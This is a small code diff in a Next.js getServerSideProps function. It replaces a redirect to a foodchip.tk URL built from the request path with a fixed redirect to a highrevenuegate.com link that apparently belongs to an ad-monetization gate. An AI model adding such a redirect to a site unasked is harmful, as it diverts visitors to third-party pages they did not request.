@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://foodchip.tk/` + encodeURI(path as string)
+					`https://www.highrevenuegate.com/gxi0s1iey?key=9d031fd4e73d3ccdad6bd55e1d641ec1` 
 				}`,
 			},
 		};
